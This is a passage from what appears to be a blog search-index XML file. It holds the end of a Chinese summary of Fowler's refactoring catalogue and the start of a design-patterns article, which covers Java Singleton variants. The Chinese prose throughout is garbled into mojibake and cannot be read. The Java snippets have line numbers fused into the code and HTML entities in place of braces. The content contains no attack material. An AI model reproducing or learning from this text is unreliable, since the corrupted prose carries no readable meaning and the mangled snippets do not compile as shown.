æ˜¯åŠ¨æ€å¯å˜çš„ï¼Œå‰è€…é€šè¿‡ç»§æ‰¿çš„æ–¹å¼æ¥å®ç°ï¼Œåè€…é€šè¿‡ç»„åˆçš„æ–¹å¼æ¥å®ç°ã€‚å› ä¸ºç±»å‹ç å¯å˜ï¼Œå¦‚æœé€šè¿‡ç»§æ‰¿çš„æ–¹å¼ï¼Œä¸€æ—¦ä¸€ä¸ªå¯¹è±¡çš„ç±»å‹ç æ”¹å˜ï¼Œé‚£ä¹ˆå°±è¦æ”¹å˜ç”¨æ–°çš„å¯¹è±¡æ¥å–ä»£æ—§å¯¹è±¡ï¼Œè€Œå®¢æˆ·ç«¯éš¾ä»¥æ”¹å˜æ–°çš„å¯¹è±¡ã€‚ä½†æ˜¯é€šè¿‡ç»„åˆçš„æ–¹å¼ï¼Œæ”¹å˜å¼•ç”¨çš„çŠ¶æ€ç±»æ˜¯å¾ˆå®¹æ˜“çš„ã€‚ 16. ä»¥å­—æ®µå–ä»£å­ç±» Replace Subclass with Fields å„ä¸ªå­ç±»çš„å”¯ä¸€å·®åˆ«åªåœ¨â€œè¿”å›å¸¸é‡æ•°æ®â€çš„å‡½æ•°ä¸Šã€‚ å…«ã€ç®€åŒ–æ¡ä»¶è¡¨è¾¾å¼1. åˆ†è§£æ¡ä»¶è¡¨è¾¾å¼ Decompose Conditional å¯¹äºä¸€ä¸ªå¤æ‚çš„æ¡ä»¶è¯­å¥ï¼Œå¯ä»¥ä» ifã€thenã€else ä¸‰ä¸ªæ®µè½ä¸­åˆ†åˆ«æç‚¼å‡ºç‹¬ç«‹å‡½æ•°ã€‚ 1234if (data.befor(SUMMER_START) || data.after(SUMMER_END)) charge = quantity * winterRate + winterServiceCharge;else charge = quantity * summerRate; 1234if (notSummer(date)) charge = winterCharge(quantity);else charge = summerCharge(quantity); 2. åˆå¹¶æ¡ä»¶è¡¨è¾¾å¼ Consolidate Conditional Expression æœ‰ä¸€ç³»åˆ—æ¡ä»¶æµ‹è¯•ï¼Œéƒ½å¾—åˆ°ç›¸åŒç»“æœã€‚ å°†è¿™äº›æµ‹è¯•åˆå¹¶ä¸ºä¸€ä¸ªæ¡ä»¶è¡¨è¾¾å¼ï¼Œå¹¶å°†è¿™ä¸ªæ¡ä»¶è¡¨è¾¾å¼æç‚¼æˆä¸ºä¸€ä¸ªç‹¬ç«‹å‡½æ•°ã€‚ 123456double disabilityAmount() &#123; if (seniority &lt; 2) return 0; if (monthsDisabled &gt; 12 ) return 0; if (isPartTime) return 0; // ...&#125; 1234double disabilityAmount() &#123; if (isNotEligibleForDisability()) return 0; // ...&#125; 3. åˆå¹¶é‡å¤çš„æ¡ä»¶ç‰‡æ®µ Consolidate Duplicate Conditional Fragments åœ¨æ¡ä»¶è¡¨è¾¾å¼çš„æ¯ä¸ªåˆ†æ”¯ä¸Šæœ‰ç€ç›¸åŒçš„ä¸€æ®µä»£ç ã€‚ å°†è¿™æ®µé‡å¤ä»£ç æ¬ç§»åˆ°æ¡ä»¶è¡¨è¾¾å¼ä¹‹å¤–ã€‚ 1234567if (isSpecialDeal()) &#123; total = price * 0.95; send();&#125; else &#123; total = price * 0.98; send();&#125; 123456if (isSpecialDeal()) &#123; total = price * 0.95;&#125; else &#123; total = price * 0.98;&#125;send(); 4. ç§»é™¤æ§åˆ¶æ ‡è®° Remove Control Flag åœ¨ä¸€ç³»åˆ—å¸ƒå°”è¡¨è¾¾å¼ä¸­ï¼ŒæŸä¸ªå˜é‡å¸¦æœ‰â€œæ§åˆ¶æ ‡è®°â€çš„ä½œç”¨ã€‚ ç”¨ break è¯­å¥æˆ– return è¯­å¥æ¥å–ä»£æ§åˆ¶æ ‡è®°ã€‚ 5. ä»¥å«è¯­å¥å–ä»£åµŒå¥—æ¡ä»¶è¡¨è¾¾å¼ Replace Nested Conditional with Guard Clauses å¦‚æœæŸä¸ªæ¡ä»¶æå…¶ç½•è§ï¼Œå°±åº”è¯¥å•ç‹¬æ£€æŸ¥è¯¥æ¡ä»¶ï¼Œå¹¶åœ¨è¯¥æ¡ä»¶ä¸ºçœŸæ—¶ç«‹åˆ»ä»å‡½æ•°ä¸­è¿”å›ï¼Œè¿™æ ·çš„å•ç‹¬æ£€æŸ¥å¸¸å¸¸è¢«ç§°ä¸ºâ€œå«è¯­å¥â€ï¼ˆguard clausesï¼‰ã€‚ æ¡ä»¶è¡¨è¾¾å¼é€šå¸¸æœ‰ä¸¤ç§è¡¨ç°å½¢å¼ã€‚ç¬¬ä¸€ç§å½¢å¼æ˜¯ï¼šæ‰€æœ‰åˆ†æ”¯éƒ½å±äºæ­£å¸¸è¡Œä¸ºã€‚ç¬¬äºŒç§å½¢å¼åˆ™æ˜¯ï¼šæ¡ä»¶è¡¨è¾¾å¼æä¾›çš„ç­”æ¡ˆä¸­åªæœ‰ä¸€ç§æ˜¯æ­£å¸¸è¡Œä¸ºï¼Œå…¶ä»–éƒ½æ˜¯ä¸å¸¸è§çš„æƒ…å†µï¼Œå¯ä»¥ä½¿ç”¨å«è¯­å¥è¡¨ç°æ‰€æœ‰ç‰¹æ®Šæƒ…å†µã€‚ 123456789101112double getPayAmount() &#123; double result; if (isDead) result = deadAmount(); else &#123; if (isSeparated) result = separatedAmount(); else &#123; if (isRetired) result = retiredAmount(); else result = normalPayAmount(); &#125;; &#125; return result;&#125;; 123456double getPayAmount() &#123; if (isDead) return deadAmount(); if (isSeparated) return separatedAmount(); if (isRetired) return retiredAmount(); return normalPayAmount();&#125;; 6. ä»¥å¤šæ€å–ä»£æ¡ä»¶è¡¨è¾¾å¼ Replace Conditional with Polymorphism å°†è¿™ä¸ªæ¡ä»¶è¡¨è¾¾å¼çš„æ¯ä¸ªåˆ†æ”¯æ”¾è¿›ä¸€ä¸ªå­ç±»å†…çš„è¦†å†™å‡½æ•°ä¸­ï¼Œç„¶åå°†åŸå§‹å‡½æ•°å£°æ˜ä¸ºæŠ½è±¡å‡½æ•°ã€‚éœ€è¦å…ˆä½¿ç”¨ Replace Type Code with Subclass æˆ– Replace Type Code with State/Strategy æ¥å»ºç«‹ç»§æ‰¿ç»“æœã€‚ 1234567891011double getSpeed() &#123; switch (type) &#123; case EUROPEAN: return getBaseSpeed(); case AFRICAN: return getBaseSpeed()- getLoadFactor()* numberOfCoconuts; case NORWEGIAN_BLUE: return isNailed ? 0 : getBaseSpeed(voltage); &#125; throw new RuntimeException("Should be unreachable");&#125; 7. å¼•å…¥ Null å¯¹è±¡ Introduce Null Object å°† null å€¼æ›¿æ¢ä¸º null å¯¹è±¡ã€‚è¿™æ ·åšçš„å¥½å¤„åœ¨äºï¼Œä¸éœ€è¦è¯¢é—®å¯¹è±¡æ˜¯å¦ä¸ºç©ºï¼Œç›´æ¥è°ƒç”¨å°±è¡Œã€‚ 12if (customer == null) plan = BillingPlan.basic();else plan = customer.getPlan(); 8. å¼•å…¥æ–­è¨€ Introduce Assertion ä»¥æ–­è¨€æ˜ç¡®è¡¨ç°æŸç§å‡è®¾ã€‚æ–­è¨€åªèƒ½ç”¨äºå¼€å‘è¿‡ç¨‹ä¸­ï¼Œäº§å“ä»£ç ä¸­ä¸ä¼šæœ‰æ–­è¨€ã€‚ 1234double getExpenseLimit() &#123; // should have either expense limit or a primary project return (expenseLimit != NULL_EXPENSE) ? expenseLimit : primaryProject.getMemberExpenseLimit();&#125; 1234double getExpenseLimit() &#123; Assert.isTrue (expenseLimit != NULL_EXPENSE || primaryProject != null); return (expenseLimit != NULL_EXPENSE) ? expenseLimit : primaryProject.getMemberExpenseLimit();&#125; ä¹ã€ç®€åŒ–å‡½æ•°è°ƒç”¨1. å‡½æ•°æ”¹å Rename Method ä½¿å‡½æ•°åèƒ½è§£é‡Šå‡½æ•°çš„ç”¨é€”ã€‚ 2. æ·»åŠ å‚æ•° Add Parameter ä½¿å‡½æ•°ä¸éœ€è¦é€šè¿‡è°ƒç”¨è·å¾—æŸä¸ªä¿¡æ¯ã€‚ 3. ç§»é™¤å‚æ•° Remove Parameter ä¸ Add Parameter ç›¸åï¼Œæ”¹ç”¨è°ƒç”¨çš„æ–¹å¼æ¥è·å¾—æŸä¸ªä¿¡æ¯ã€‚ 4. å°†æŸ¥è¯¢å‡½æ•°å’Œä¿®æ”¹å‡½æ•°åˆ†ç¦» Separate Query from Modifier æŸä¸ªå‡½æ•°å³è¿”å›å¯¹è±¡çŠ¶æ€å€¼ï¼Œåˆä¿®æ”¹å¯¹è±¡çŠ¶æ€ã€‚ åº”å½“å»ºç«‹ä¸¤ä¸ªä¸åŒçš„å‡½æ•°ï¼Œå…¶ä¸­ä¸€ä¸ªè´Ÿè´£æŸ¥è¯¢ï¼Œå¦ä¸€ä¸ªè´Ÿè´£ä¿®æ”¹ã€‚ä»»ä½•æœ‰è¿”å›å€¼çš„å‡½æ•°ï¼Œéƒ½ä¸åº”è¯¥æœ‰çœ‹å¾—åˆ°çš„å‰¯ä½œç”¨ã€‚ 1getTotalOutstandingAndSetReadyForSummaries(); 12getTotalOutstanding();setReadyForSummaries(); 5. ä»¤å‡½æ•°æºå¸¦å‚æ•° Parameterize Method è‹¥å¹²å‡½æ•°åšäº†ç±»ä¼¼çš„å·¥ä½œï¼Œä½†åœ¨å‡½æ•°æœ¬ä½“ä¸­å´åŒ…å«äº†ä¸åŒçš„å€¼ã€‚ å»ºç«‹å•ä¸€å‡½æ•°ï¼Œä»¥å‚æ•°è¡¨è¾¾é‚£äº›ä¸åŒçš„å€¼ã€‚ 12fivePercentRaise();tenPercentRaise(); 1raise(percentage); 6. ä»¥æ˜ç¡®å‡½æ•°å–ä»£å‚æ•° Replace Parameter with Explicit Methods æœ‰ä¸€ä¸ªå‡½æ•°ï¼Œå®Œå…¨å–å†³äºå‚æ•°å€¼è€Œé‡‡å–ä¸åŒè¡Œä¸ºã€‚ é’ˆå¯¹è¯¥å‚æ•°çš„æ¯ä¸€ä¸ªå¯èƒ½å€¼ï¼Œå»ºç«‹ä¸€ä¸ªç‹¬ç«‹å‡½æ•°ã€‚ 1234567891011void setValue(String name, int value)&#123; if (name.equals("height"))&#123; height = value; return; &#125; if (name.equals("width"))&#123; width = value; return; &#125; Assert.shouldNeverReachHere();&#125; 123456void setHeight(int arg)&#123; height = arg;&#125;void setWidth(int arg)&#123; width = arg;&#125; 7. ä¿æŒå¯¹è±¡å®Œæ•´ Preserve Whole Object ä»æŸä¸ªå¯¹è±¡ä¸­å–å‡ºè‹¥å¹²å€¼ï¼Œå°†å®ƒä»¬ä½œä¸ºæŸä¸€æ¬¡å‡½æ•°è°ƒç”¨æ—¶çš„å‚æ•°ã€‚ æ”¹ä¸ºä¼ é€’æ•´ä¸ªå¯¹è±¡ã€‚ 123int low = daysTempRange().getLow();int high = daysTempRange().getHigh();withinPlan = plan.withinRange(low, high); 1withinPlan = plan.withinRange(daysTempRange()); 8. ä»¥å‡½æ•°å–ä»£å‚æ•° Replace Parameter with Methods å¯¹è±¡è°ƒç”¨æŸä¸ªå‡½æ•°ï¼Œå¹¶å°†æ‰€å¾—ç»“æœä½œä¸ºå‚æ•°ï¼Œä¼ é€’ç»™å¦ä¸€ä¸ªå‡½æ•°ã€‚è€Œæ¥å—è¯¥å‚æ•°çš„å‡½æ•°æœ¬èº«ä¹Ÿèƒ½å¤Ÿè°ƒç”¨å‰ä¸€ä¸ªå‡½æ•°ã€‚ è®©å‚æ•°æ¥æ”¶è€…å»é™¤è¯¥é¡¹å‚æ•°ï¼Œè€Œæ˜¯ç›´æ¥è°ƒç”¨å‰ä¸€ä¸ªå‡½æ•°ã€‚ 123int basePrice = _quantity * _itemPrice;discountLevel = getDiscountLevel();double finalPrice = discountedPrice (basePrice, discountLevel); 12int basePrice = _quantity * _itemPrice;double finalPrice = discountedPrice (basePrice); 9. å¼•å…¥å‚æ•°å¯¹è±¡ Introduce Parameter Object æŸäº›å‚æ•°æ€»æ˜¯å¾ˆè‡ªç„¶åœ°åŒæ—¶å‡ºç°ï¼Œè¿™äº›å‚æ•°å°±æ˜¯ Data Clumpsã€‚ ä»¥ä¸€ä¸ªå¯¹è±¡å–ä»£è¿™äº›å‚æ•°ã€‚ 10. ç§»é™¤è®¾å€¼å‡½æ•° Remove Setting Method ç±»ä¸­çš„æŸä¸ªå­—æ®µåº”è¯¥åœ¨å¯¹è±¡åˆ›å»ºæ—¶è¢«è®¾å€¼ï¼Œç„¶åå°±ä¸å†æ”¹å˜ã€‚ å»æ‰è¯¥å­—æ®µçš„æ‰€æœ‰è®¾å€¼å‡½æ•°ï¼Œå¹¶å°†è¯¥å­—æ®µè®¾ä¸º finalã€‚ 11. éšè—å‡½æ•° Hide Method æœ‰ä¸€ä¸ªå‡½æ•°ï¼Œä»æ¥æ²¡æœ‰è¢«å…¶ä»–ä»»ä½•ç±»ç”¨åˆ°ã€‚ å°†è¿™ä¸ªå‡½æ•°ä¿®æ”¹ä¸º privateã€‚ 12. ä»¥å·¥å‚å‡½æ•°å–ä»£æ„é€ å‡½æ•° Replace Constructor with Factory Method å¸Œæœ›åœ¨åˆ›å»ºå¯¹è±¡æ—¶ä¸ä»…ä»…æ˜¯åšç®€å•çš„å»ºæ„åŠ¨ä½œã€‚ å°†æ„é€ å‡½æ•°æ›¿æ¢ä¸ºå·¥å‚å‡½æ•°ã€‚ 13. å°è£…å‘ä¸‹è½¬å‹ Encapsulate Downcast æŸä¸ªå‡½æ•°è¿”å›çš„å¯¹è±¡ï¼Œéœ€è¦ç”±å‡½æ•°è°ƒç”¨è€…æ‰§è¡Œå‘ä¸‹è½¬å‹ï¼ˆdowncastï¼‰ã€‚ å°†å‘ä¸‹è½¬å‹åŠ¨ä½œç§»åˆ°å‡½æ•°ä¸­ã€‚ 123Object lastReading() &#123; return readings.lastElement();&#125; 123Reading lastReading() &#123; return (Reading)readings.lastElement();&#125; 14. ä»¥å¼‚å¸¸å–ä»£é”™è¯¯ç  Replace Error Code with Exception æŸä¸ªå‡½æ•°è¿”å›ä¸€ä¸ªç‰¹å®šçš„ä»£ç ï¼Œç”¨ä»¥è¡¨ç¤ºæŸç§é”™è¯¯æƒ…å†µã€‚ æ”¹ç”¨å¼‚å¸¸ï¼Œå¼‚å¸¸å°†æ™®é€šç¨‹åºå’Œé”™è¯¯å¤„ç†åˆ†å¼€ï¼Œä½¿ä»£ç æ›´å®¹æ˜“ç†è§£ã€‚ 15. ä»¥æµ‹è¯•å–ä»£å¼‚å¸¸ Replace Exception with Test é¢å¯¹ä¸€ä¸ªè°ƒç”¨è€…å¯ä»¥é¢„å…ˆæ£€æŸ¥çš„æ¡ä»¶ï¼Œä½ æŠ›å‡ºäº†ä¸€ä¸ªå¼‚å¸¸ã€‚ ä¿®æ”¹è°ƒç”¨è€…ï¼Œä½¿å®ƒåœ¨è°ƒç”¨å‡½æ•°ä¹‹å‰å…ˆåšæ£€æŸ¥ã€‚ 1234567double getValueForPeriod(int periodNumber) &#123; try &#123; return values[periodNumber]; &#125; catch (ArrayIndexOutOfBoundsException e) &#123; return 0; &#125;&#125; 123double getValueForPeriod(int periodNumber) &#123; if (periodNumber &gt;= values.length) return 0; return values[periodNumber]; åã€å¤„ç†æ¦‚æ‹¬å…³ç³»1. å­—æ®µä¸Šç§» Pull Up Field ä¸¤ä¸ªå­ç±»æ‹¥æœ‰ç›¸åŒçš„å­—æ®µã€‚ å°†è¯¥å­—æ®µç§»è‡³è¶…ç±»ã€‚ 2. å‡½æ•°ä¸Šç§» Pull Up Method æœ‰äº›å‡½æ•°ï¼Œåœ¨å„ä¸ªå­ç±»ä¸­äº§ç”Ÿå®Œå…¨ç›¸åŒçš„ç»“æœã€‚ å°†è¯¥å‡½æ•°ç§»è‡³è¶…ç±»ã€‚ 3. æ„é€ å‡½æ•°æœ¬ä½“ä¸Šç§» Pull Up Constructor Body ä½ åœ¨å„ä¸ªå­ç±»ä¸­æ‹¥æœ‰ä¸€äº›æ„é€ å‡½æ•°ï¼Œå®ƒä»¬çš„æœ¬ä½“å‡ ä¹å®Œå…¨ä¸€è‡´ã€‚ åœ¨è¶…ç±»ä¸­æ–°å»ºä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå¹¶åœ¨å­ç±»æ„é€ å‡½æ•°ä¸­è°ƒç”¨å®ƒã€‚ 1234567class Manager extends Employee...public Manager(String name, String id, int grade) &#123; this.name = name; this.id = id; this.grade = grade;&#125; 1234public Manager(String name, String id, int grade) &#123; super(name, id); this.grade = grade;&#125; 4. å‡½æ•°ä¸‹ç§» Push Down Method è¶…ç±»ä¸­çš„æŸä¸ªå‡½æ•°åªä¸éƒ¨åˆ†å­ç±»æœ‰å…³ã€‚ å°†è¿™ä¸ªå‡½æ•°ç§»åˆ°ç›¸å…³çš„é‚£äº›å­ç±»å»ã€‚ 5. å­—æ®µä¸‹ç§» Push Down Field è¶…ç±»ä¸­çš„æŸä¸ªå­—æ®µåªè¢«éƒ¨åˆ†å­ç±»ç”¨åˆ°ã€‚ å°†è¿™ä¸ªå­—æ®µç§»åˆ°éœ€è¦å®ƒçš„é‚£äº›å­ç±»å»ã€‚ 6. æç‚¼å­ç±» Extract Subclass ç±»ä¸­çš„æŸäº›ç‰¹æ€§åªè¢«æŸäº›å®ä¾‹ç”¨åˆ°ã€‚ æ–°å»ºä¸€ä¸ªå­ç±»ï¼Œå°†ä¸Šé¢æ‰€è¯´çš„é‚£ä¸€éƒ¨åˆ†ç‰¹æ€§ç§»åˆ°å­ç±»ä¸­ã€‚ 7. æç‚¼è¶…ç±» Extract Superclass ä¸¤ä¸ªç±»æœ‰ç›¸ä¼¼ç‰¹æ€§ã€‚ ä¸ºè¿™ä¸¤ä¸ªç±»å»ºç«‹ä¸€ä¸ªè¶…ç±»ï¼Œå°†ç›¸åŒç‰¹æ€§ç§»è‡³è¶…ç±»ã€‚ 8. æç‚¼æ¥å£ Extract Interface è‹¥å¹²å®¢æˆ·ä½¿ç”¨ç±»æ¥å£ä¸­çš„åŒä¸€å­é›†ï¼Œæˆ–è€…ä¸¤ä¸ªç±»çš„æ¥å£æœ‰éƒ¨åˆ†ç›¸åŒã€‚ å°†ç›¸åŒçš„å­é›†æç‚¼åˆ°ä¸€ä¸ªç‹¬ç«‹æ¥å£ä¸­ã€‚ 9. æŠ˜å ç»§æ‰¿ä½“ç³» Collapse Hierarchy è¶…ç±»å’Œå­ç±»ä¹‹é—´æ— å¤ªå¤§åŒºåˆ«ã€‚ å°†å®ƒä»¬åˆä¸ºä¸€ä½“ã€‚ 10. å¡‘é€ æ¨¡æ¿å‡½æ•° Form Template Method ä½ æœ‰ä¸€äº›å­ç±»ï¼Œå…¶ä¸­ç›¸åº”çš„æŸäº›å‡½æ•°ä»¥ç›¸åŒé¡ºåºæ‰§è¡Œç±»ä¼¼çš„æ“ä½œï¼Œä½†å„ä¸ªæ“ä½œçš„ç»†èŠ‚ä¸Šæœ‰æ‰€ä¸åŒã€‚ å°†è¿™äº›æ“ä½œåˆ†åˆ«æ”¾è¿›ç‹¬ç«‹å‡½æ•°ä¸­ï¼Œå¹¶ä¿æŒå®ƒä»¬éƒ½æœ‰ç›¸åŒçš„ç­¾åï¼Œäºæ˜¯åŸå‡½æ•°ä¹Ÿå°±å˜å¾—ç›¸åŒäº†ã€‚ç„¶åå°†åŸå‡½æ•°ä¸Šç§»è‡³è¶…ç±»ã€‚(æ¨¡æ¿æ–¹æ³•æ¨¡å¼) 11. ä»¥å§”æ‰˜å–ä»£ç»§æ‰¿ Replace Inheritance with Delegation æŸä¸ªå­ç±»åªä½¿ç”¨è¶…ç±»æ¥å£ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œæˆ–æ˜¯æ ¹æœ¬ä¸éœ€è¦ç»§æ‰¿è€Œæ¥çš„æ•°æ®ã€‚ åœ¨å­ç±»ä¸­æ–°å»ºä¸€ä¸ªå­—æ®µç”¨ä»¥ä¿å­˜è¶…ç±»ï¼Œè°ƒæ•´å­ç±»å‡½æ•°ï¼Œä»¤å®ƒæ”¹è€Œå§”æ‰˜è¶…ç±»ï¼Œç„¶åå»æ‰ä¸¤è€…ä¹‹é—´çš„ç»§æ‰¿å…³ç³»ã€‚ 12. ä»¥ç»§æ‰¿å–ä»£å§”æ‰˜ Replace Delegation with Inheritance ä½ åœ¨ä¸¤ä¸ªç±»ä¹‹é—´ä½¿ç”¨å§”æ‰˜å…³ç³»ï¼Œå¹¶ç»å¸¸ä¸ºæ•´ä¸ªæ¥å£ç¼–å†™è®¸å¤šæç®€å•çš„å§”æ‰˜å‡½æ•°ã€‚ è®©å§”æ‰˜ç±»ç»§æ‰¿å—æ‰˜ç±»ã€‚ å‚è€ƒèµ„æ–™ MartinFowler, ç¦å‹’, è´å…‹, ç­‰. é‡æ„: æ”¹å–„æ—¢æœ‰ä»£ç çš„è®¾è®¡ [M]. ç”µå­å·¥ä¸šå‡ºç‰ˆç¤¾, 2011.]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è®¾è®¡æ¨¡å¼]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[ä¸€ã€æ¦‚è¿° äºŒã€åˆ›å»ºå‹ 1. å•ä¾‹ï¼ˆSingletonï¼‰ 2. ç®€å•å·¥å‚ï¼ˆSimple Factoryï¼‰ 3. å·¥å‚æ–¹æ³•ï¼ˆFactory Methodï¼‰ 4. æŠ½è±¡å·¥å‚ï¼ˆAbstract Factoryï¼‰ 5. ç”Ÿæˆå™¨ï¼ˆBuilderï¼‰ 6. åŸå‹æ¨¡å¼ï¼ˆPrototypeï¼‰ ä¸‰ã€è¡Œä¸ºå‹ 1. è´£ä»»é“¾ï¼ˆChain Of Responsibilityï¼‰ 2. å‘½ä»¤ï¼ˆCommandï¼‰ 3. è§£é‡Šå™¨ï¼ˆInterpreterï¼‰ 4. è¿­ä»£å™¨ï¼ˆIteratorï¼‰ 5. ä¸­ä»‹è€…ï¼ˆMediatorï¼‰ 6. å¤‡å¿˜å½•ï¼ˆMementoï¼‰ 7. è§‚å¯Ÿè€…ï¼ˆObserverï¼‰ 8. çŠ¶æ€ï¼ˆStateï¼‰ 9. ç­–ç•¥ï¼ˆStrategyï¼‰ 10. æ¨¡æ¿æ–¹æ³•ï¼ˆTemplate Methodï¼‰ 11. è®¿é—®è€…ï¼ˆVisitorï¼‰ 12. ç©ºå¯¹è±¡ï¼ˆNullï¼‰ å››ã€ç»“æ„å‹ 1. é€‚é…å™¨ï¼ˆAdapterï¼‰ 2. æ¡¥æ¥ï¼ˆBridgeï¼‰ 3. ç»„åˆï¼ˆCompositeï¼‰ 4. è£…é¥°ï¼ˆDecoratorï¼‰ 5. å¤–è§‚ï¼ˆFacadeï¼‰ 6. äº«å…ƒï¼ˆFlyweightï¼‰ 7. ä»£ç†ï¼ˆProxyï¼‰ å‚è€ƒèµ„æ–™ ä¸€ã€æ¦‚è¿°è®¾è®¡æ¨¡å¼æ˜¯è§£å†³é—®é¢˜çš„æ–¹æ¡ˆï¼Œå­¦ä¹ ç°æœ‰çš„è®¾è®¡æ¨¡å¼å¯ä»¥åšåˆ°ç»éªŒå¤ç”¨ã€‚ æ‹¥æœ‰è®¾è®¡æ¨¡å¼è¯æ±‡ï¼Œåœ¨æ²Ÿé€šæ—¶å°±èƒ½ç”¨æ›´å°‘çš„è¯æ±‡æ¥è®¨è®ºï¼Œå¹¶ä¸”ä¸éœ€è¦äº†è§£åº•å±‚ç»†èŠ‚ã€‚ æºç ä»¥åŠ UML å›¾ äºŒã€åˆ›å»ºå‹1. å•ä¾‹ï¼ˆSingletonï¼‰æ„å›¾ç¡®ä¿ä¸€ä¸ªç±»åªæœ‰ä¸€ä¸ªå®ä¾‹ï¼Œå¹¶æä¾›è¯¥å®ä¾‹çš„å…¨å±€è®¿é—®ç‚¹ã€‚ ç±»å›¾ä½¿ç”¨ä¸€ä¸ªç§æœ‰æ„é€ å‡½æ•°ã€ä¸€ä¸ªç§æœ‰é™æ€å˜é‡ä»¥åŠä¸€ä¸ªå…¬æœ‰é™æ€å‡½æ•°æ¥å®ç°ã€‚ ç§æœ‰æ„é€ å‡½æ•°ä¿è¯äº†ä¸èƒ½é€šè¿‡æ„é€ å‡½æ•°æ¥åˆ›å»ºå¯¹è±¡å®ä¾‹ï¼Œåªèƒ½é€šè¿‡å…¬æœ‰é™æ€å‡½æ•°è¿”å›å”¯ä¸€çš„ç§æœ‰é™æ€å˜é‡ã€‚ å®ç°ï¼ˆä¸€ï¼‰æ‡’æ±‰å¼-çº¿ç¨‹ä¸å®‰å…¨ ä»¥ä¸‹å®ç°ä¸­ï¼Œç§æœ‰é™æ€å˜é‡ uniqueInstance è¢«å»¶è¿ŸåŒ–å®ä¾‹åŒ–ï¼Œè¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œå¦‚æœæ²¡æœ‰ç”¨åˆ°è¯¥ç±»ï¼Œé‚£ä¹ˆå°±ä¸ä¼šå®ä¾‹åŒ– uniqueInstanceï¼Œä»è€ŒèŠ‚çº¦èµ„æºã€‚ è¿™ä¸ªå®ç°åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹æ˜¯ä¸å®‰å…¨çš„ï¼Œå¦‚æœå¤šä¸ªçº¿ç¨‹èƒ½å¤ŸåŒæ—¶è¿›å…¥ if (uniqueInstance == null) ï¼Œå¹¶ä¸”æ­¤æ—¶ uniqueInstance ä¸º nullï¼Œé‚£ä¹ˆå¤šä¸ªçº¿ç¨‹ä¼šæ‰§è¡Œ uniqueInstance = new Singleton(); è¯­å¥ï¼Œè¿™å°†å¯¼è‡´å¤šæ¬¡å®ä¾‹åŒ– uniqueInstanceã€‚ 1234567891011121314public class Singleton &#123; private static Singleton uniqueInstance; private Singleton() &#123; &#125; public static Singleton getUniqueInstance() &#123; if (uniqueInstance == null) &#123; uniqueInstance = new Singleton(); &#125; return uniqueInstance; &#125;&#125; ï¼ˆäºŒï¼‰æ‡’æ±‰å¼-çº¿ç¨‹å®‰å…¨ åªéœ€è¦å¯¹ getUniqueInstance() æ–¹æ³•åŠ é”ï¼Œé‚£ä¹ˆåœ¨ä¸€ä¸ªæ—¶é—´ç‚¹åªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½å¤Ÿè¿›å…¥è¯¥æ–¹æ³•ï¼Œä»è€Œé¿å…äº†å¯¹ uniqueInstance è¿›è¡Œå¤šæ¬¡å®ä¾‹åŒ–çš„é—®é¢˜ã€‚ ä½†æ˜¯è¿™æ ·æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å½“ä¸€ä¸ªçº¿ç¨‹è¿›å…¥è¯¥æ–¹æ³•ä¹‹åï¼Œå…¶å®ƒçº¿ç¨‹è¯•å›¾è¿›å…¥è¯¥æ–¹æ³•éƒ½å¿…é¡»ç­‰å¾…ï¼Œå› æ­¤æ€§èƒ½ä¸Šæœ‰ä¸€å®šçš„æŸè€—ã€‚ 123456public static synchronized Singleton getUniqueInstance() &#123; if (uniqueInstance == null) &#123; uniqueInstance = new Singleton(); &#125; return uniqueInstance;&#125; ï¼ˆä¸‰ï¼‰é¥¿æ±‰å¼-çº¿ç¨‹å®‰å…¨ çº¿ç¨‹ä¸å®‰å…¨é—®é¢˜ä¸»è¦æ˜¯ç”±äº uniqueInstance è¢«å®ä¾‹åŒ–äº†å¤šæ¬¡ï¼Œå¦‚æœ uniqueInstance é‡‡ç”¨ç›´æ¥å®ä¾‹åŒ–çš„è¯ï¼Œå°±ä¸ä¼šè¢«å®ä¾‹åŒ–å¤šæ¬¡ï¼Œä¹Ÿå°±ä¸ä¼šäº§ç”Ÿçº¿ç¨‹ä¸å®‰å…¨é—®é¢˜ã€‚ä½†æ˜¯ç›´æ¥å®ä¾‹åŒ–çš„æ–¹å¼ä¹Ÿä¸¢å¤±äº†å»¶è¿Ÿå®ä¾‹åŒ–å¸¦æ¥çš„èŠ‚çº¦èµ„æºçš„ä¼˜åŠ¿ã€‚ 1private static Singleton uniqueInstance = new Singleton(); ï¼ˆå››ï¼‰åŒé‡æ ¡éªŒé”-çº¿ç¨‹å®‰å…¨ uniqueInstance åªéœ€è¦è¢«å®ä¾‹åŒ–ä¸€æ¬¡ï¼Œä¹‹åå°±å¯ä»¥ç›´æ¥ä½¿ç”¨äº†ã€‚åŠ é”æ“ä½œåªéœ€è¦å¯¹å®ä¾‹åŒ–é‚£éƒ¨åˆ†çš„ä»£ç è¿›è¡Œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåªæœ‰å½“ uniqueInstance æ²¡æœ‰è¢«å®ä¾‹åŒ–æ—¶ï¼Œæ‰éœ€è¦è¿›è¡ŒåŠ é”ã€‚ åŒé‡æ ¡éªŒé”å…ˆåˆ¤æ–­ uniqueInstance æ˜¯å¦å·²ç»è¢«å®ä¾‹åŒ–ï¼Œå¦‚æœæ²¡æœ‰è¢«å®ä¾‹åŒ–ï¼Œé‚£ä¹ˆæ‰å¯¹å®ä¾‹åŒ–è¯­å¥è¿›è¡ŒåŠ é”ã€‚ 123456789101112131415161718public class Singleton &#123; private volatile static Singleton uniqueInstance; private Singleton() &#123; &#125; public static Singleton getUniqueInstance() &#123; if (uniqueInstance == null) &#123; synchronized (Singleton.class) &#123; if (uniqueInstance == null) &#123; uniqueInstance = new Singleton(); &#125; &#125; &#125; return uniqueInstance; &#125;&#125; 